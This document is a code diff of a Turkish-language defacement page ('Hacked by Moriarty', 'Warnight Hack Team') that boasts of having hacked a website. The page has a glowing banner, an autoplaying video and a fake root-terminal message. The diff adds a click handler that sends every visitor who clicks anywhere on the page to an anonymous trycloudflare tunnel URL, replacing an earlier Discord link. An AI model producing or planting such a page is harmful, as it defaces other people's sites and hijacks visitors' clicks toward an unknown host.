@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hacked by Moriarty</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
         * {
             margin: 0;
@@ -59,15 +60,26 @@
             border: 2px solid #00ff00;
             box-shadow: 0 0 15px #00ff00;
         }
-        #footer {
-            font-size: 28px;
-            color: #9b00ff; /* Parlak mor */
+        #warnight-hack-team {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 32px;
+            color: #ff00ff;
             font-weight: bold;
-            margin-top: 20px;
             text-align: center;
-            text-shadow: 0 0 10px #9b00ff, 0 0 20px #9b00ff; /* Parlak mor gölge */
+            text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
             animation: glow 1.5s infinite alternate;
-            cursor: pointer; /* Tıklanabilir cursor */
+            cursor: pointer;
+            transition: color 0.3s ease, text-shadow 0.3s ease;
+        }
+        #warnight-hack-team:hover {
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+        }
+        #warnight-hack-team i {
+            margin: 0 10px;
         }
         @keyframes glitch {
             0% { transform: translate(0) }
@@ -78,42 +90,42 @@
             100% { transform: translate(0) }
         }
         @keyframes glow {
-            0% { text-shadow: 0 0 10px #9b00ff, 0 0 20px #9b00ff; }
-            100% { text-shadow: 0 0 20px #9b00ff, 0 0 30px #9b00ff; }
+            0% { text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff; }
+            100% { text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff; }
         }
     </style>
 </head>
 <body>
     <div id="terminal"></div>
-    
+
     <div class="hacked">Hacked by Moriarty</div>
     <div class="site-hacked">Bu site Moriarty tarafından hacklenmiştir!</div>
-    
+
     <div class="video-container">
-        <iframe 
-            width="100%" 
-            height="350" 
-            src="https://www.youtube.com/embed/b5SejYpST5Q?si=SmK9bN-EzCm3l8eJ&controls=0&autoplay=1&mute=0&loop=1&playlist=b5SejYpST5Q" 
-            title="warnight uğradı:)" 
-            frameborder="0" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-            referrerpolicy="strict-origin-when-cross-origin" 
+        <iframe
+            width="100%"
+            height="350"
+            src="https://www.youtube.com/embed/b5SejYpST5Q?si=SmK9bN-EzCm3l8eJ&controls=0&autoplay=1&mute=0&loop=1&playlist=b5SejYpST5Q"
+            title="warnight uğradı:)"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+            referrerpolicy="strict-origin-when-cross-origin"
             allowfullscreen>
         </iframe>
     </div>
 
-    <div id="footer" onclick="window.location.href='https://discord.gg/QRppCpjvZc'">
-        hacked by warnight
+    <div id="warnight-hack-team" onclick="window.location.href='https://renewable-angels-bikini-roles.trycloudflare.com/'">
+        <i class="fas fa-skull-crossbones"></i> Warnight Hack Team <i class="fas fa-skull-crossbones"></i>
     </div>
 
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             document.addEventListener('click', () => {
-                window.location.href = "https://discord.gg/QRppCpjvZc";
+                window.location.href = "https://renewable-angels-bikini-roles.trycloudflare.com/";
             });
 
             const terminal = document.getElementById('terminal');
-            
+
             const messages = [
                 "root@moriarty:~$ selamlar kankalar > \n",
                 "root@moriarty:~$ ben bu siteye ya canım sıkıldığı için girmişimdir\n",
